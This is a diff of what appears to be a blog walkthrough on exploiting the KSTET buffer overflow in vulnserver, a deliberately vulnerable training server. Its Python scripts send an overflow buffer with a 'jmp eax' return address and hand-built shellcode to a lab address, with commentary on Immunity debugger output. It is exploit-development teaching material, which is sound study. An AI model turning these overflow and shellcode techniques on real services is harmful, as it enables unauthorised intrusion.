@@ -97,7 +97,7 @@ command = "KSTET "
 
 # 2000 bytes to crash vulnserver.exe
 crash = "\x41" * 70
-crash += "\xb1\x11\x50\x62"		# 0x625011b1 jmp eax essfunc.dll
+crash += "\xb1\x11\x50\x62"	# 0x625011b1 jmp eax essfunc.dll
 crash += "\x43" * (2000-len(crash))
 
 s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -221,7 +221,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			    # xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				      # push ecx
@@ -301,7 +301,7 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			    # xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				      # push ecx
@@ -320,6 +320,11 @@ s.connect(("172.16.55.143", 9999))
 
 s.send(command+crash)
 ```
+Execution in Immunity:
+
+As we can see, ESP is now pointing about 50 bytes above our initial buffer of A's
+
+<img src="{{ site.url }}{{ site.baseurl }}/images/015.png" alt="">
 
 Flags
 ---
@@ -364,14 +369,17 @@ command = "KSTET "
 # Software breakpoint to pause execution
 crash = "\xCC" * 2
 
-# Creating File Descriptor
+# Creating File Descriptor = 0x00000088
 crash += "\x31\xc9"			    # xor ecx, ecx
 crash += "\x80\xc1\x88"			# add cl, 0x88
 crash += "\x51"				      # push ecx
 crash += "\x89\xe7"			    # mov edi, esp
 
-# Flags
-crash += "\x31\x2d"		    	# xor edx, edx
+# Move ESP out of the way
+crash += "\x83\xec\x50"			# sub esp, 0x50
+
+# Flags = 0x00000000
+crash += "\x31\xd2"
 crash += "\x52"				      # push edx
 
 # 70 byte offset to EIP
@@ -383,6 +391,7 @@ s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect(("172.16.55.143", 9999))
 
 s.send(command+crash)
+
 ```
 
 Execution in Immunity:
@@ -390,13 +399,17 @@ Execution in Immunity:
 ```console
 xor edx, edx
 ```
+EDX is now zero.
 
-<img src="{{ site.url }}{{ site.baseurl }}/images/014.png" alt="">
+<img src="{{ site.url }}{{ site.baseurl }}/images/016.png" alt="">
 
 ```console
 push edx
 ```
 
-A glimpse of the stack:
+A glimpse of the stack, with a value of zero:
 
-<img src="{{ site.url }}{{ site.baseurl }}/images/015.png" alt="">
+<img src="{{ site.url }}{{ site.baseurl }}/images/017.png" alt="">
+
+BufSize
+---
